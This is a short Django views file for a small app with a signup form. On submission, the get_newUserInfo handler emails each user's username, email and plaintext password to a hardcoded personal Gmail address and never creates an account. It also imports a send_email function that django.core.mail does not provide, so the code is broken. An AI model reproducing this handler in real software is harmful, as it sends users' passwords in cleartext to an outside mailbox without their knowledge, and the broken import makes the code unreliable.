from django.shortcuts import render
from django.http import HttpResponse, HttpResponseRedirect
from .forms import CreatUserForm
from django.core.mail import send_email

# Create your views here.
#index page
def index(request):
    return render(request, 'index.html')
    # return HttpResponse("HELLO WORLD")


#form username handler

def get_newUserInfo(request):
    if request.method == "POST":
        form = CreatUserForm(request.POST)
        if form.is_valid():
            username = form.cleaned_data['username']
            email = form.cleaned_data['email']
            password = form.cleaned_data['password']
            recipients = ["august12.feb2004@gmail.com"]
            send_email("Created User", f"You created user: {username} with email: {email} and password: {password}", email, recipients)
            return HttpResponseRedirect("/thanks/")
    else:
        form = CreatUserForm()

    return render(request, "index.html", {'form': form})
